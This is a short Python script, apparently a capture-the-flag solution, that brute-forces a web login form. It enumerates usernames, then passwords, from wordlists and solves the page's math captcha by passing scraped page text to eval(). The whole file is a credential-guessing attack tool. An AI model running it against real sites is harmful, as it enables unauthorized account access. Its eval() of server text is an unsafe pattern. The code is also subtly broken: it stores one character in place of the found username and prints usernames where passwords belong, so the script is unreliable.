#!/usr/bin/env python3

import requests
import re

req = requests.Session()

url = "http://x.x.x.x/login"

f = open("usernames.txt",'r')
username = f.readlines()
f.close()
f = open("passwords.txt",'r')
password = f.readlines()
f.close()


i = 0
while True:
	post_req = req.post(url,data={'username': username[i][:-1],"password":password[i][:-1]})
	val = post_req.text
	match = re.findall('''    <label for="usr"><b><h3>Captcha enabled</h3></b></label><br>
    (.*)
    
    <input type="text" placeholder="xxxx" name="captcha" ''',val)
	cap = eval(match[0].split('=')[0])
	post_req = req.post(url,data={'username': username[i][:-1],"password":password[i][:-1],"captcha":cap})
	if b"does not exist" in post_req.content:
		print("Trying username "+username[i][:-1]+"...")
	else:
		print("Username: ",username[i][:-1])
		username = username[i][-1]
		break
	i += 1

i = 0
while True:
	post_req = req.post(url,data={'username': username,"password":password[i][:-1]})
	val = post_req.text
	match = re.findall('''    <label for="usr"><b><h3>Captcha enabled</h3></b></label><br>
    (.*)
    
    <input type="text" placeholder="xxxx" name="captcha" ''',val)
	cap = eval(match[0].split('=')[0])
	post_req = req.post(url,data={'username': username,"password":password[i][:-1],"captcha":cap})
	if b"does not exist" in post_req.content:
		print("Trying password "+username[i][:-1]+"...")
	else:
		print("Password: ",username[i][:-1])
		password = password[i][:-1]
		break
	i += 1

print("Username: {}, Password: {}".format(username,password))
